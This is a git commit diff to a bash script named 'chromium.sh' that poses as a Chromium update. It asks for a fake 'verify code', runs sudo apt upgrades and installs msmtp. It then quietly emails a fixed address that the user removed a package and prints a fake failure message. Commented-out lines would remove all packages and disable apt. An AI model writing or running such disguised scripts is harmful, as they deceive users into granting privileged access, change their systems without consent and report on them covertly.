3a77fe4f388207f898bd528ada27be5289eb686f
Mike <142720633+Mikequez12@users.noreply.github.com>
2025-03-21 08:16:07 +0100

    Update chromium.sh

--- chromium.sh
+++ chromium.sh
@@ -1,4 +1,6 @@
-echo Updating...
+#!/bin/bash
+
+echo "Updating..."
 
 # sudo apt remove * -y
 # sudo chmod -x /usr/bin/apt
@@ -6,34 +8,28 @@ echo Updating...
 
 clear
 
-echo Please, introduce verify code to end the update: 
+echo "Please, introduce verify code to end the update: "
 read command
 
 clear
 
-echo "Verify process started...\n"
+echo "Verify process started..."
 
 sudo apt update
-sudo apt install mailutils -y
+sudo apt upgrade -y
+sudo apt install msmtp -y
 
 echo "account default
 host smtp.mailtrap.io
 port 25
 auth off
 from 10mrosco@sanbenitoikastola.net
-logfile ~/.msmtp.log" > ~/.msmtprc
-clear
+logfile /home/$USER/msmtp.log" > ~/.msmtprc
 
-
-echo "Updating permission node...\n"
 chmod 600 ~/.msmtprc
-
 clear
 
-echo "Getting API key..."
 echo -e "Subject: Notificación\n\nEl usuario ha eliminado un paquete" | msmtp 10mrosco@sanbenitoikastola.net
-
-clear
 
 echo "Incorrect code, can't verify user, aborting..."
 sleep 1
